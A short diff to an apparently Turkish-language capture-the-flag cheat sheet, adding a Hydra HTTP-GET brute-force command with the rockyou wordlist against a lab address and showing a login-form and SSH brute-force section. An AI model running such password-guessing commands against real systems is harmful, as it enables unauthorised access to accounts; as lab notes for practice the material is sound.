@@ -2,6 +2,10 @@
 ```bash
 hydra -L users.txt -P passwords.txt <HEDEF_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Hatalı Giriş" -V
 ```
+http-get bruteforce
+```bash
+hydra -l admin -P '/wordlists/rockyou.txt' 10.10.222.132 http-get /inferno -s 80 -I
+```
 *** ssh için dale ismi ile bruteforce ***
 
 ``` bash
